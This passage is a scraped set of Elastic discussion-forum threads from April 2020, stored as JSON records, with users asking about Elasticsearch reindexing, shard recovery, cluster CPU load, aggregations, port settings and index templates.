03:25:16,650 WARN [f.p.e.c.f.c.FsCrawlerCli] job [index_45.79.189.33] does not exist 03:25:16,651 INFO [f.p.e.c.f.c.FsCrawlerCli] Do you want to create it (Y/N)? y 03:25:19,614 INFO [f.p.e.c.f.c.FsCrawlerCli] Settings have been created in [test_dir_45.79.189.33/index_45.79.189.33/_settings.yaml]. Please review and edit before relaunch [ls@li1288-33 fscrawler-es7-2.7-SNAPSHOT]$ vim test_dir_45.79.189.33/index_45.79.189.33/_settings.yaml [ls@li1288-33 fscrawler-es7-2.7-SNAPSHOT]$ bin/fscrawler --config_dir test_dir_45.79.189.33 index_45.79.189.33 --loop 1 --restart 03:28:57,555 INFO [f.p.e.c.f.c.BootstrapChecks] Memory [Free/Total=Percent]: HEAP [61.2mb/843mb=7.27%], RAM [1.8gb/3.7gb=49.25%], Swap [511.9mb/511.9mb=100.0%]. 03:28:58,727 INFO [f.p.e.c.f.c.v.ElasticsearchClientV7] Elasticsearch Client for version 7.x connected to a node running version 7.5.1 03:28:58,841 INFO [f.p.e.c.f.FsCrawlerImpl] Starting FS crawler 03:28:59,209 INFO [f.p.e.c.f.FsParserAbstract] FS crawler started for [index_45.79.189.33] for [/mnt/sp/fsSharepointFiles] every [15m] 03:28:59,791 WARN [o.a.t.p.PDFParser] J2KImageReader not loaded. JPEG2000 files will not be processed. See https://pdfbox.apache.org/2.0/dependencies.html#jai-image-io for optional dependencies. 03:29:00,745 INFO [f.p.e.c.f.FsParserAbstract] FS crawler is stopping after 1 run 03:29:00,914 INFO [f.p.e.c.f.FsCrawlerImpl] FS crawler [index_45.79.189.33] stopped Could you please tell me why re-indexing is not working properly? -Lisa",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "c5b842ab-bf6d-45ce-920b-bc8a02bc230a",
    "url": "https://discuss.elastic.co/t/csv-from-curl-command/228165",
    "title": "CSV from curl command",
    "category": [
      "Elasticsearch"
    ],
    "author": "rohitarora275",
    "date": "April 15, 2020, 4:04pm April 15, 2020, 4:14pm April 17, 2020, 12:07pm",
    "body": "Is there way to download csv from curl command instead of json response",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "5341658a-176e-4e6e-a380-ea9094fcd5cb",
    "url": "https://discuss.elastic.co/t/moving-shards-is-slow-solution/228412",
    "title": "Moving shards is slow - Solution",
    "category": [
      "Elasticsearch"
    ],
    "author": "klahnakoski",
    "date": "April 16, 2020, 9:52pm April 16, 2020, 10:02pm April 17, 2020, 11:53am",
    "body": "I would like to add my solution to Moving shards is slow The solution has two parts: Ensure the primaries are balanced over all the nodes so the recovery load is well distributed. This was done with an external shard balancer: It swaps primary shards with replicas (using a series of moves) until they are evenly distributed. This increases the total shard movement, but decreases recovery time significantly when it is needed. Recover only one-shard-per-node-at-a-time, only one-primary-per-node-at-a-time. Something terrible happens when you ask a node to recover/move more than one shard at a time. Maybe it is a classic \"it takes twice as long to do twice as much\", but it seems much worse than that. When shards must recover, we track which pair of nodes (source node and destination node) is involved and ensure those nodes are not already busy with another shard recovery. By blocking recoveries until the nodes are free, the overall recovery time is reduced significantly. This technique is also done with the same external shard balancer. Using this technique, shard recovery can be reduced from a week (or never, in some pathological shard/node cases), to a couple of days. The cluster went from constantly yellow, to almost always green. Life is good now. You can also turn off ingestion during recovery: It noticeably improves recovery time, but that is common knowledge. Note: The cluster is about 40 EC2 nodes, 4K shards (2K primary shards), median shard size is about 20Gb, total primaries sum to 35Tb on disk.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ca320ec2-eb18-45c1-abd0-20180e690fad",
    "url": "https://discuss.elastic.co/t/retrieving-sorted-documents-from-large-index/228499",
    "title": "Retrieving sorted documents from large index",
    "category": [
      "Elasticsearch"
    ],
    "author": "itsash",
    "date": "April 17, 2020, 11:47am",
    "body": "(topic withdrawn by author, will be automatically deleted in 24 hours unless flagged)",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4f5133c2-58b5-468c-bc35-c8e81db29ae0",
    "url": "https://discuss.elastic.co/t/retrieving-model-parameters-of-data-frame-analytics-job/227608",
    "title": "Retrieving model parameters of Data Frame Analytics job",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 11, 2020, 2:14pm April 13, 2020, 12:12pm April 17, 2020, 10:56am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "75765f5b-57e1-44b2-bbb1-5a0421fd4665",
    "url": "https://discuss.elastic.co/t/gradle-plugin-id-run-does-not-run-all-modules/228489",
    "title": "Gradle :plugins:plugin-id:run does not run all modules",
    "category": [
      "Elasticsearch"
    ],
    "author": "christopher.rossbach",
    "date": "April 17, 2020, 10:21am",
    "body": "Hi. I want to debug an existing plugin (e.g. ingest-attachment). Starting elastic search with the plugin by running ./gradlew :plugin:ingest-attachment:run --debug-jvm -Drun.distribution=oss and attaching the debugger works fine. But not all modules are loaded, e.g. _reindex is not available, whereas running ./gradlew run --debug-jvm -Drun.distribution=oss loads all modules. I verified that by curl localhost:9200/_nodes?pretty, only the transport-netty4 module is available when using the plugin:ingest-attachment:run task. How can I make the modules available? Futher I need to run multiple plugins at the same time, how can I do that? Thanks, Christopher",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b0c9e3d3-182c-452f-b593-35c77867fafc",
    "url": "https://discuss.elastic.co/t/how-to-disable-dedicated-ingest/228482",
    "title": "How to disable dedicated ingest",
    "category": [
      "Elasticsearch"
    ],
    "author": "manpec",
    "date": "April 17, 2020, 9:34am",
    "body": "Hi there, I created a new template data_master_ingest. after that while creating a new deployment with this template I also marked dedicated ingest but we don't want to use it. in my data_master_ingest-deployment is ingest=false. Is it possible to disable dedicated ingest with the UI? thanks best regards new user without ECE-experience",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "ee85b1f7-08c9-478c-bf72-cbc3c12a813b",
    "url": "https://discuss.elastic.co/t/unassigned-shard-reason-unclear/228478",
    "title": "Unassigned shard reason unclear",
    "category": [
      "Elasticsearch"
    ],
    "author": "ntsh999",
    "date": "April 17, 2020, 8:53am",
    "body": "My ElasticSearch Cluster is in RED status, when I used the GET _cluster/allocation/explain?pretty API call I got the following output. I can see that there are 2 unassigned shards , but the allocate_explanation and can_allocate mentioned in the API output does not make any sense to me. Can some help me in understanding what should be the fix for this unassigned shards reason ? { \"index\" : \"filebeat-7.2.0-2020.04.12\", \"shard\" : 0, \"primary\" : true, \"current_state\" : \"unassigned\", \"unassigned_info\" : { \"reason\" : \"INDEX_CREATED\", \"at\" : \"2020-04-17T01:00:17.446Z\", \"last_allocation_status\" : \"no\" }, \"can_allocate\" : \"yes\", \"allocate_explanation\" : \"can allocate the shard\", \"target_node\" : { \"id\" : \"9W8u53F0QhSkSKjzrtNytQ\", \"name\" : \"elasticsearch-data-0\", \"transport_address\" : \"10.244.0.218:9300\" }, \"node_allocation_decisions\" : [ { \"node_id\" : \"9W8u53F0QhSkSKjzrtNytQ\", \"node_name\" : \"elasticsearch-data-0\", \"transport_address\" : \"10.244.0.218:9300\", \"node_decision\" : \"yes\", \"weight_ranking\" : 1 }, { \"node_id\" : \"pOyKt1QGTiycRHHhFo96fw\", \"node_name\" : \"elasticsearch-data-1\", \"transport_address\" : \"10.244.2.150:9300\", \"node_decision\" : \"yes\", \"weight_ranking\" : 2 } ] }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "36e33678-7822-42d3-bddd-e47ed4a3de33",
    "url": "https://discuss.elastic.co/t/long-period-of-querying-failure-during-node-timeout/228442",
    "title": "Long period of querying failure during node timeout",
    "category": [
      "Elasticsearch"
    ],
    "author": "rsk0",
    "date": "April 17, 2020, 4:00am April 17, 2020, 4:49am April 17, 2020, 6:50am April 17, 2020, 8:14pm",
    "body": "I've got a large 5.6.3 cluster with a couple high-query-rate (low update rate) indices spread evenly across the nodes. We had a node freeze up (VM paused during unplanned hypervisor restart) which correlated with a large error spike in our querying. I guess that's to be expected. But, All the data nodes' CPU utilizations dropped during the period the node was timing out, about 1.5 minutes. The error spike seemed much larger than the number of in-flight queries you'd expect to have dropped from the loss of one node. Cluster-wide the queries dropped to 0, again for about 1.5 minutes. I get the impression that the cluster was basically put on pause while the node timed out. If that's plausible, I'm expecting it's because of inability to update cluster state while trying to reach a node it thinks should be there, and that that somehow blocked broadcast of new queries. (Or... every query was still trying to hit the absent node?) But does ES really behave this way? I don't remember having seen this in the past. Does anyone have opinion on the pros/cons of setting a faster node transport ping timeout? I figure if the cluster is paused while waiting for node timeouts, and if timeouts take 1.5 minutes (3 ping rounds of 30s each?), and if nodes generally ping very reliably, then shortening the ping timeout to, say, 5 seconds could prevent long outages from single node failures without too frequently marking nodes as timed out.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d9c922d9-c4aa-4d66-8478-00d647e772d7",
    "url": "https://discuss.elastic.co/t/elasticsearch-noob-license-question/228456",
    "title": "Elasticsearch noob license question",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 20, 2020, 9:41pm April 21, 2020, 4:55pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "439e98e2-03e0-474d-b4c0-61595499e63b",
    "url": "https://discuss.elastic.co/t/invalid-aggregation-order-path/228472",
    "title": "Invalid aggregation order path",
    "category": [
      "Elasticsearch"
    ],
    "author": "Damiano",
    "date": "April 17, 2020, 8:10am",
    "body": "Hello everybody! I am using ElasticSearch 7.6 with a test index that has the following mapping: { \"test\" : { \"mappings\" : { \"properties\" : { \"amount\" : { \"type\" : \"long\" }, \"group_id\" : { \"type\" : \"long\" }, \"id\" : { \"type\" : \"long\" } } } } } Now, i am using the following query: { \"size\": 0, \"track_total_hits\": false, \"aggs\": { \"strategies\": { \"terms\": { \"field\": \"group_id\", \"order\": { \"drawdown\": \"asc\" }, \"size\": 100, \"include\": { \"partition\": 1, \"num_partitions\": 100 } }, \"aggs\": { \"drawdown\": { \"scripted_metric\": { \"init_script\": \"state.id = 0; state.cumsum = 0; state.max = 0; state.min = 0; state.diff = 0\", \"map_script\": \"state.cumsum += doc.amount.value; if (state.cumsum>state.max) {state.max=state.cumsum;state.id=doc.id.value} if (state.max - state.cumsum >= state.diff) {state.min=state.cumsum;state.diff=state.max - state.cumsum;}\", \"combine_script\": \"return state;\", \"reduce_script\": \"states.sort((x, y) -> x.id - y.id); int min = states[0].min; int max = states[0].max; for(int i = 1; i < states.length; i++) { int nextMin = states[i].min; int nextMax = states[i].max; if (max > nextMax && min > nextMin) { min = nextMin; } else if (max < nextMax && max-min < nextMax-nextMin) { max = nextMax; min = nextMin;} } return max-min;\" } } } } } } If i remove the order part the query works good, i am referring to the following piece: \"order\": {\"drawdown\": \"asc\"} How can i sort by the value returned by drawdown aggregation? The error that i get is: { \"error\": { \"root_cause\": [ { \"type\": \"aggregation_execution_exception\", \"reason\": \"Invalid aggregation order path [drawdown]. Buckets can only be sorted on a sub-aggregator path that is built out of zero or more single-bucket aggregations within the path and a final single-bucket or a metrics aggregation at the path end.\" } ], \"type\": \"search_phase_execution_exception\", \"reason\": \"all shards failed\", \"phase\": \"query\", \"grouped\": true, \"failed_shards\": [ { \"shard\": 0, \"index\": \"test\", \"node\": \"jHJ3_eOLQ3iZZeHZPI_dFA\", \"reason\": { \"type\": \"aggregation_execution_exception\", \"reason\": \"Invalid aggregation order path [drawdown]. Buckets can only be sorted on a sub-aggregator path that is built out of zero or more single-bucket aggregations within the path and a final single-bucket or a metrics aggregation at the path end.\" } } ] }, \"status\": 500 }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b25917d1-62ca-4814-b32b-9d476b884904",
    "url": "https://discuss.elastic.co/t/ingest-pipeline-for-routing-data-into-2-different-indexes/228189",
    "title": "Ingest Pipeline for routing data into 2 different indexes",
    "category": [
      "Elasticsearch"
    ],
    "author": "Mack_rogers",
    "date": "April 15, 2020, 6:44pm April 15, 2020, 7:44pm April 17, 2020, 8:04am",
    "body": "How can you write into 2 different indexes using a ingest pipeline? Example. a single doc with fields a , b, c, and d ? index A will receive fields A & B index B will receive fields C & D How can I accomplish this with ingest pipelines?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "22a8f9c3-fa1b-476a-9d62-257eb4459376",
    "url": "https://discuss.elastic.co/t/setting-number-of-shards-is-not-working-by-elasticsearch-rest-high-level-client-7-6-1-closed/228439",
    "title": "Setting number_of_shards is not working by elasticsearch-rest-high-level-client(7.6.1)【CLOSED】",
    "category": [
      "Elasticsearch"
    ],
    "author": "Wenjun_Yin",
    "date": "April 17, 2020, 6:14am April 17, 2020, 3:56am April 20, 2020, 9:41pm April 17, 2020, 7:59am",
    "body": "Here is my code, the core part is in the red box. image1112×837 52.9 KB After running this code, I check the index setting through Kibana. It shows my setting is not working. image768×810 26.8 KB Is there anyone can help me. THANKS",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "131480ed-08fd-422d-a47b-21788dc46a86",
    "url": "https://discuss.elastic.co/t/high-cpu-percent-of-elasticsearch/228465",
    "title": "High cpu percent of elasticsearch",
    "category": [
      "Elasticsearch"
    ],
    "author": "tiara",
    "date": "April 17, 2020, 7:52am",
    "body": "Hi, We have our production cluster full use of cpu with very little index or query. We deploy two nodes each machine，each node use more than 1000% cpu with 24 cpu cores image1019×161 102 KB image1129×132 86.7 KB JDK 1.8.0_131 ES 6.3.1 2 nodes per machine ,echo node 31GB heap centos 7, here is the hot_threads： ::: {node1}{SKbtlde0Tw2Lln7_o5mNpA}{MNez5no7T_GcXNcq2-zu0A}{1******}{1*****:9300}{xpack.installed=true} Hot threads at 2020-04-17T06:52:28.124Z, interval=1s, busiestThreads=3, ignoreIdleThreads=true: 100.3% (1s out of 1s) cpu usage by thread 'elasticsearch[node1][[transport_server_worker.default]][T#32]' 4/10 snapshots sharing following 62 elements java.util.zip.Deflater.deflateBytes(Native Method) java.util.zip.Deflater.deflate(Deflater.java:444) java.util.zip.Deflater.deflate(Deflater.java:366) java.util.zip.DeflaterOutputStream.deflate(DeflaterOutputStream.java:251) java.util.zip.DeflaterOutputStream.write(DeflaterOutputStream.java:211) java.io.BufferedOutputStream.flushBuffer(BufferedOutputStream.java:82) java.io.BufferedOutputStream.write(BufferedOutputStream.java:95) org.elasticsearch.common.io.stream.OutputStreamStreamOutput.writeByte(OutputStreamStreamOutput.java:35) org.elasticsearch.common.io.stream.StreamOutput.writeBoolean(StreamOutput.java:425) org.elasticsearch.common.io.stream.StreamOutput.writeOptionalWriteable(StreamOutput.java:806) org.elasticsearch.cluster.routing.ShardRouting.writeToThin(ShardRouting.java:294) org.elasticsearch.cluster.routing.IndexShardRoutingTable$Builder.writeToThin(IndexShardRoutingTable.java:834) org.elasticsearch.cluster.routing.IndexRoutingTable.writeTo(IndexRoutingTable.java:308) org.elasticsearch.cluster.routing.RoutingTable.writeTo(RoutingTable.java:360) org.elasticsearch.cluster.ClusterState.writeTo(ClusterState.java:742) org.elasticsearch.discovery.zen.PublishClusterStateAction.serializeFullClusterState(PublishClusterStateAction.java:355) org.elasticsearch.action.admin.cluster.state.TransportClusterStateAction.masterOperation(TransportClusterStateAction.java:136) org.elasticsearch.action.admin.cluster.state.TransportClusterStateAction.masterOperation(TransportClusterStateAction.java:44) org.elasticsearch.action.support.master.TransportMasterNodeAction.masterOperation(TransportMasterNodeAction.java:88) org.elasticsearch.action.support.master.TransportMasterNodeAction$AsyncSingleAction$2.doRun(TransportMasterNodeAction.java:174) org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) org.elasticsearch.common.util.concurrent.EsExecutors$1.execute(EsExecutors.java:135) org.elasticsearch.action.support.master.TransportMasterNodeAction$AsyncSingleAction.doStart(TransportMasterNodeAction.java:171) org.elasticsearch.action.support.master.TransportMasterNodeAction$AsyncSingleAction.start(TransportMasterNodeAction.java:127) org.elasticsearch.action.support.master.TransportMasterNodeAction.doExecute(TransportMasterNodeAction.java:105) org.elasticsearch.action.support.master.TransportMasterNodeAction.doExecute(TransportMasterNodeAction.java:55) org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:167) org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:139) org.elasticsearch.action.support.HandledTransportAction$TransportHandler.messageReceived(HandledTransportAction.java:79) org.elasticsearch.action.support.HandledTransportAction$TransportHandler.messageReceived(HandledTransportAction.java:69) org.elasticsearch.transport.RequestHandlerRegistry.processMessageReceived(RequestHandlerRegistry.java:66) org.elasticsearch.transport.TcpTransport$RequestHandler.doRun(TcpTransport.java:1592) org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) org.elasticsearch.common.util.concurrent.EsExecutors$1.execute(EsExecutors.java:135) org.elasticsearch.transport.TcpTransport.handleRequest(TcpTransport.java:1550) org.elasticsearch.transport.TcpTransport.messageReceived(TcpTransport.java:1414) org.elasticsearch.transport.netty4.Netty4MessageChannelHandler.channelRead(Netty4MessageChannelHandler.java:64) io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:310) io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:297) io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:413) io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:265) io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) io.netty.handler.logging.LoggingHandler.channelRead(LoggingHandler.java:241) io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1359) io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:935) io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:134) io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:645) io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:545) io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:499) io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:459) io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:858) java.lang.Thread.run(Thread.java:748) thx for any help",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "e0e6101e-f9a3-48b1-a870-ab018f977516",
    "url": "https://discuss.elastic.co/t/after-changing-port-number-in-elasticsearch-yml-file-its-get-failed-to-start-elasticsearch/227115",
    "title": "After changing port number in Elasticsearch.yml file its get Failed to start Elasticsearch",
    "category": [
      "Elasticsearch"
    ],
    "author": "MdRashid",
    "date": "April 8, 2020, 11:58am April 8, 2020, 1:11pm April 8, 2020, 6:04pm April 17, 2020, 7:46am April 9, 2020, 8:39am April 14, 2020, 6:33am April 14, 2020, 10:09am April 14, 2020, 9:15am April 14, 2020, 10:17am April 14, 2020, 10:38am April 14, 2020, 1:20pm April 14, 2020, 1:32pm April 14, 2020, 3:57pm April 15, 2020, 4:12am April 15, 2020, 4:50am April 15, 2020, 10:28am April 15, 2020, 9:30am April 15, 2020, 12:36pm April 16, 2020, 7:05am April 16, 2020, 8:09am",
    "body": "Elasticsearch v7.5.2 (I'm using it) Changing Port from 9200 to 9300 See below images you will get understand why i am facing this issue for the past 3 days i want to give port number of 9300 instead of 9200 in elasticsearch.yml file. After changing the port number i restart the service of elasticsearch after that its get failed to start and when i give http.port on 9200 it work fine but not on 9300. what is transport.tcp.port: 9300, i added in elasticsearch.yml file its correct or wrong to please see all images in attached. please do help me urgently 31286×492 187 KB 4 log files1300×679 162 KB 21288×272 69.2 KB 1830×674 61.6 KB 5811×88 16.2 KB",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "368f281a-d6b2-4893-a884-3d8c77a053f7",
    "url": "https://discuss.elastic.co/t/elasticsearch-reindix-range/228454",
    "title": "Elasticsearch reindix range",
    "category": [
      "Elasticsearch"
    ],
    "author": "Mohammad_Mousavi",
    "date": "April 17, 2020, 6:37am",
    "body": "Hi, in my index template \"clientip\" field is text. so I need to reindex the indices. It's been about 2 months and indices are create every day: logstash-vod-2020.04.14 logstash-vod-2020.04.13 In docs I see I should use something like this: POST _reindex { \"source\": { \"index\": \"twitter\" }, \"dest\": { \"index\": \"new_twitter\", } } How can I write some loop or script that takes the dates and starts to reindex ? How can I change only \"clientip\" data type from text to ip ? It's my first time in ES reindex, I guess this \"dest\" index is kind of temp and I should change the name of it to what is was before. I mean logstash-vod-2020.04.14 will reindex to logstash-vod-2020.04.14_new, logstash-vod-2020.04.14 will be deleted, logstash-vod-2020.04.14_new will renamed to logstash-vod-2020.04.14. Am I right ? That was a long question, thank you so much",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "bbb42ea8-3c58-4796-bd98-348408fef6ea",
    "url": "https://discuss.elastic.co/t/best-practice-for-a-newbie/228030",
    "title": "Best practice for a newbie",
    "category": [
      "Elasticsearch"
    ],
    "author": "Rhh",
    "date": "April 15, 2020, 4:37am April 15, 2020, 11:56am April 16, 2020, 10:03am April 17, 2020, 6:34am",
    "body": "Hi I am totaly new to elastic and tries to figure out how to use elastic with serilog as provider. I have a lot of different log sources (100 +), and they all generate a JSON I need to log. I know I can log the different JSON's in one field, but I thing for searching purposes this will not fly well. Most of the JSON's are different in the respect of common fields, maybe only 5-10% in some of them where common fields will occure. So my questions is : Should I save the complete JSON in one field or should I split the JSON's into separate fields for every data inside it ? If I create separate fields for every data in the JSON's, due to the different structures, should I have them all in the same index ? If not, should I create one index pr JSON type ? Will this not influence performance ? Regards Sample 1 : { \"message\": \"my custom data 1\" } Sample 2 : { \"message\": \"my custom data 2\", \"data\": { \"A\": \"valueA\", \"B\": { \"B1\": \"valueB1\" }, \"C\": { \"C1\": \"valueC1\", \"C2\": { \"C2_1\": \"valueC2_1\", \"C2_2\": \"valueC2_2\" } } } } Sample 3 : { \"message\": \"my custom data 3\", \"data1\": { \"D\": { \"D1\": { \"D1_1\": \"valueC1_1\", \"D1_2\": \"valueC1_2\" } }, \"data2\": { \"X\": { \"X1_1\": \"valueX1_1\", \"X1_2\": \"valueX1_2\" } } } }",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1e4193fb-6af1-4775-b3de-99678e4233e7",
    "url": "https://discuss.elastic.co/t/query-using-array-values-against-string-value/227851",
    "title": "Query using array values against String value",
    "category": [
      "Elasticsearch"
    ],
    "author": "ngr",
    "date": "April 14, 2020, 5:16am April 14, 2020, 7:34am April 14, 2020, 8:34am April 14, 2020, 9:16am April 14, 2020, 9:46am April 14, 2020, 10:55am April 14, 2020, 11:01am April 14, 2020, 1:04pm April 17, 2020, 6:01am",
    "body": "version : \"6.5.4\" I have mapping like : { \"examples\" : { \"mappings\" : { \"example\" : { \"properties\" : { // ... \"petGender\" : { \"type\" : \"text\" } } } } } } and values for GET /examples/_search : { \"took\" : 0, \"timed_out\" : false, \"_shards\" : { \"total\" : 5, \"successful\" : 5, \"skipped\" : 0, \"failed\" : 0 }, \"hits\" : { \"total\" : 1, \"max_score\" : 1.0, \"hits\" : [ { \"_index\" : \"examples\", \"_type\" : \"example\", \"_id\" : \"5e9038d11543752\", \"_score\" : 1.0, \"_source\" : { \"gender\" : \"All\", // ... } } ] } } and i want to query like : GET /examples/_search { \"query\": { \"bool\": { \"must\": [ { \"bool\": { \"should\": [ //... { \"term\": { \"gender\": [\"All\"] //[\"Male\",\"Female\"] } }, // ... ] } } ] } } } and i get empty response how do i perform query like this using array values against String value",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "1be894da-82df-4da5-8cc8-2094316911be",
    "url": "https://discuss.elastic.co/t/how-to-use-a-doc-field-to-search-another-doc/228431",
    "title": "How to use a doc field to search another doc?",
    "category": [
      "Elasticsearch"
    ],
    "author": "kanbekotori",
    "date": "April 17, 2020, 2:21am April 17, 2020, 2:39am April 17, 2020, 3:13am April 17, 2020, 4:53am April 17, 2020, 5:59am",
    "body": "customer doc { \"id\": \"123\", \"name\": \"alibaba\", \"sellerId\": \"111\" } workflow doc { \"id\": \"100\", \"title\": \"hello\", \"customerId\": \"123\" } I want to search workflow documents with sallerId, it look like { \"query\": { \"bool\": { \"must\": [ { \"term\": { \"sellerId\": { \"value\": \"111\" } } } ] } } } I can't use parent-child, because customer is not really a parent of workflow, some workflow doc dosen't has customer infomation. How could i use customer.sellerId to search workflow doc.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "ece3e0a4-d4ed-4daf-81ae-66d0aa681f97",
    "url": "https://discuss.elastic.co/t/elasticsearch-debugging-percolator-candidates/228453",
    "title": "Elasticsearch debugging percolator candidates",
    "category": [
      "Elasticsearch"
    ],
    "author": "Faiz_Ahmed_Mushtak_H",
    "date": "April 17, 2020, 5:16am",
    "body": "I'd like to know which package should I enable the logger of to know the potential candidates ES is going to try percolating against? Also, as part of percolator response, why can't ES return a metric saying how many candidates were tried? This is a good metric to know whenever percolators start slowing down",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "930a4b34-d016-4b66-9806-f2090d23d154",
    "url": "https://discuss.elastic.co/t/extra-keys-not-allowed-data-actions-check-configuration-file-when-curator-start/228288",
    "title": "Extra keys not allowed @ data['actions']. Check configuration file when curator start",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 16, 2020, 9:31am April 17, 2020, 5:12am April 17, 2020, 5:12am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ac621b1a-2c6b-498c-b1f6-54488819253a",
    "url": "https://discuss.elastic.co/t/compute-alias-from-index-name-when-using-index-template/228450",
    "title": "Compute alias from index name when using index template",
    "category": [
      "Elasticsearch"
    ],
    "author": "Jinlian_Chen",
    "date": "April 17, 2020, 5:02am",
    "body": "I have check some discussion on #5359, seems nothing do for it. I have some index like receipt_2018_v1, receipt_2019_v1, if I change the mapping, the index name will go to receipt_2018_v2, receipt_2019_v2, the alias of these index are read_receipt_2018, read_receipt_2019. I check the doc, it only support some placeholder, any suggestion on this use case? Or am I missing some other way?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "3d0f9b7e-f27b-4ed2-847a-11e0569f4d1f",
    "url": "https://discuss.elastic.co/t/restrict-internet-access-to-elasticsearch-service/228294",
    "title": "Restrict Internet Access to Elasticsearch Service",
    "category": [
      "Elasticsearch"
    ],
    "author": "anonsw",
    "date": "April 16, 2020, 10:14am April 16, 2020, 11:59am April 17, 2020, 12:50am April 17, 2020, 3:35am",
    "body": "Hi Team, I am not able to find relevant documentation to restrict internet access to my elasticsearch service cluster with platinum license other than SSO. I would like to block all the internet access to our cluster and only whitelist some internal corporate IP ranges.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4fef557a-d6d9-4b4d-8a22-99b250526236",
    "url": "https://discuss.elastic.co/t/templates-in-v8-and-beyond/228432",
    "title": "Templates in v8 and Beyond",
    "category": [
      "Elasticsearch"
    ],
    "author": "wwalker",
    "date": "April 17, 2020, 3:21am April 17, 2020, 3:33am",
    "body": "So I've read through the notice about the removal of mapping types, but I can't wrap my head around it or find a straight forward example of how the new templates should look. So, given the below, what does it look like in 8+? \"agent\": { \"properties\": { \"ephemeral_id\": { \"type\": \"keyword\" }, \"hostname\": { \"type\": \"keyword\" }, \"id\": { \"type\": \"keyword\" }, \"name\": { \"type\": \"keyword\" }, \"type\": { \"type\": \"keyword\" }, \"version\": { \"type\": \"keyword\" }, \"ip\":{ \"type\": \"ip\" } } }",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "cc88355f-e5f0-4801-bdae-524ee99e8665",
    "url": "https://discuss.elastic.co/t/elastic-master-node-high-cpu/228347",
    "title": "Elastic master node high cpu",
    "category": [
      "Elasticsearch"
    ],
    "author": "kyle_che",
    "date": "April 16, 2020, 2:56pm April 16, 2020, 3:05pm April 16, 2020, 3:16pm April 16, 2020, 3:37pm April 16, 2020, 3:43pm April 16, 2020, 3:44pm April 16, 2020, 4:06pm April 16, 2020, 4:20pm April 16, 2020, 4:27pm April 16, 2020, 4:30pm April 17, 2020, 3:16am",
    "body": "I have a cluster with 3 master nodes, 6 coordinating nodes, and 18 data nodes. the elected master node is at 95% cpu usage. I'm looking through the logs and all i see is what it has always been doing, deleting a lot of indices, creating indices, and updating number_of_replicas to [17], and failed to delete indices. the indexes have 1 primary shard and then auto expand replicas to the number of nodes in the cluster. Is there a way to figure out what causes this spike in CPU? With relational databases I can see a high cpu attached to a session but with elastic, i have no idea what process besides the main elastic process is consuming high cpu. any ideas?",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "9e6f1a84-8326-4eab-a68f-f7ab7fa811a0",
    "url": "https://discuss.elastic.co/t/calculate-success-count-in-visualization-using-json-input/227752",
    "title": "Calculate success count in Visualization using JSON Input",
